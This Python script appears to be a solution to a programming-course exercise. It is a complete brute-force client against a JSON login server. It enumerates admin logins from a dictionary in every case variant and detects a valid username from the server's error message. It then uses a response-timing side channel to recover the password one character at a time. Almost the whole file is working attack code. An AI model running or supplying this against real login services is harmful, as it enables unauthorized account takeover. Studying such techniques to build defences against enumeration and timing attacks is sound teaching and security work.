# write your code here
import argparse
import socket
import itertools
import string
import os
import json
import time


def generate_login():
    # File 'logins.txt' is a dictionary of typical admin logins
    with open('logins.txt', 'r') as logins_file:
        for line in logins_file:
            word_cases = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in line.strip('\n')))))
            for word in word_cases:
                yield ''.join(word)


def generate_password():
    character_set = string.ascii_lowercase + string.digits
    # It's impossible to send an empty byte string through a socket, because when a recv() returns 0 bytes,
    # it means the other side has closed (or is in the process of closing) the connection
    # for n in itertools.count(1):  # itertools.count(1) == range(1, len(character_set)+1)
    #     for product in itertools.product(character_set, repeat=n):
    #         yield ''.join(product)
    
    # File 'password.txt' is a prepared dictionary of typical passwords
    with open('passwords.txt', 'r') as passwords_file:
        for line in passwords_file:
            word_cases = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in line.strip('\n')))))
            for word in word_cases:
                yield ''.join(word)


def generate_next_char():
    yield from itertools.cycle(string.ascii_letters + string.digits)


def main():
    # character_set = string.ascii_letters + string.digits
    parser = argparse.ArgumentParser()
    parser.add_argument('host')
    parser.add_argument('port', type=int)
    args = parser.parse_args()

    os.chdir(r'/Users/DashaT/Desktop/')  # change current working directory to be able to open the file 'passwords.txt'
    with socket.socket() as client_socket:
        client_socket.connect((args.host, args.port))

        # 1. Try all logins with an empty password
        correct_login = ''
        for login in generate_login():
            json_message = json.dumps({"login": login, "password": ' '})
            client_socket.send(json_message.encode())
            response = json.loads(client_socket.recv(1024).decode())
            if response["result"] == "Wrong password!":
                correct_login = login
                break

        correct_password = ''
        for char in generate_next_char():
            # 2. When you find the login, try out every possible password of length 1
            # 4. Use the found login and the found letter to find the second letter of the password
            password = correct_password + char
            json_message = json.dumps({"login": correct_login, "password": password})
            start = time.perf_counter()
            client_socket.send(json_message.encode())
            response = json.loads(client_socket.recv(1024).decode())
            end = time.perf_counter()
            delay = (end - start)

            # 5. Repeat until you receive the ‘success’ message
            if response["result"] == "Connection success!":
                print(json_message)
                break
            # 3. When an exception occurs, you know that you found the first letter of the password
            elif response["result"] == "Wrong password!" and delay >= 0.1:  # "Exception happened during login"
                correct_password = password


if __name__ == '__main__':
    main()
